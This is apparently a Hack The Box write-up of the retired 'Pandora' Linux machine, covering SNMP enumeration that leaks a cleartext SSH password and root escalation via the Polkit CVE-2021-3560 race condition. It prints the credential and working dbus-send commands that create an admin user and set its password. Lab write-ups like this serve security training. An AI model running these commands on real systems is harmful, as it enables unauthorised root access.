# Pandora

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.11.136 |
| **Status** | Retired |

## Overview
Pandora is an Easy Linux machine that starts with an SNMP service leaking cleartext credentials, which grant SSH access as a low-privileged user. The box also hosts an internal Pandora FMS monitoring instance (officially exploitable via chained SQL injection/RCE for lateral movement, per HTB's own writeup), and privilege escalation to root was achieved locally via the `dbus`/`accountsservice` timing exploit for **CVE-2021-3560** (Polkit), which allows an unprivileged local user to create a new privileged user account.

## Reconnaissance
```
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp  open  http  Apache httpd 2.4.41 (Ubuntu) - "Play | Landing"
161/udp open  snmp  SNMPv1 server; net-snmp SNMPv3 server (community: public)
```
`snmpwalk`/`snmp-check` against the `public` community string (outputs preserved in `nmap/upd` and the raw `pandoraSnmpV1.snmp` / `snmpdumbv1.snmp` dumps) enumerated running processes and system contact information, disclosing `sysContact.0: Daniel`: a strong hint toward a valid local username.

## Enumeration
The SNMP process/interface listing also revealed internal networking details and confirmed the box's hostname (`pandora`). Continued SNMP string enumeration recovered plaintext credentials for the `daniel` account, which were reused successfully for SSH login. Host-internal service enumeration also identified a Pandora FMS instance bound to an internal port: HTB's official machine description notes this is reachable via port-forwarding and is vulnerable to a chained SQL injection + RCE for lateral movement to a `matt` user.

## Foothold
SSH access was obtained directly using the SNMP-derived credential:
```
daniel : HotelBabylon23
```

## Privilege Escalation
Enumeration on the host flagged an installed `accountsservice`/Polkit version affected by **CVE-2021-3560**, a race-condition vulnerability in Polkit's D-Bus authentication handling. By sending a `CreateUser` D-Bus request and killing it mid-flight at a precisely timed interval, an unprivileged process can trick `accounts-daemon` into completing a privileged account-creation/password-set request on its behalf:

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply \
  /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser \
  string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.004s ; kill $!

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply \
  /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword \
  string:'$5$KRJz08kkB2qCl4le$/qLod03fDDYyEM18m/iVuSYHn/84XXj1x5ArSuuTsG0' string:GoldenEye & sleep 0.004s ; kill $!
```
`files/CVE-2021-3560-poc.sh` automates this exact timing attack (public PoC by SecNigma, based on Kevin Backhouse's original research), inserting a new admin-group user and setting its password hash directly through the trusted `org.freedesktop.Accounts` D-Bus service: since this service runs as root, the newly created account inherits elevated privileges, and `sudo bash` from that account yields a full root shell.

## Lessons Learned
- SNMP with a guessable/default `public` community string routinely leaks usernames, process lists, and sometimes credentials: it should be disabled or locked down with strong ACLs.
- Polkit's D-Bus race condition (CVE-2021-3560) is a timing attack, not a logic bug: patched systems (Polkit ≥ 0.105-26 fixed builds) close the exact window this PoC relies on.
- The intended machine path (Pandora FMS SQLi/RCE chain + SUID PATH-injection root) was not the route captured in these local notes; this writeup documents the CVE-2021-3560 route that was actually exploited.

## Tools & References
- `files/CVE-2021-3560-poc.sh`: Polkit/`accountsservice` race-condition PoC (by SecNigma, based on research at https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/) used to create a privileged user and obtain root.
- `nmap/upd`, `pandoraSnmpV1.snmp`, `snmpdumbv1.snmp`: SNMPv1 walk output used for host/user enumeration.
- CVE-2021-3560: Polkit privilege escalation via `accounts-daemon` race condition.
- `Files/pandora` (a full local clone of the Pandora FMS web application source tree, including vendor libraries/fonts): omitted from the repository for size/hygiene; Pandora FMS is referenced above by name for context, see https://pandorafms.com/.
- `tmp.py` (empty scratch file): removed as non-substantive clutter.
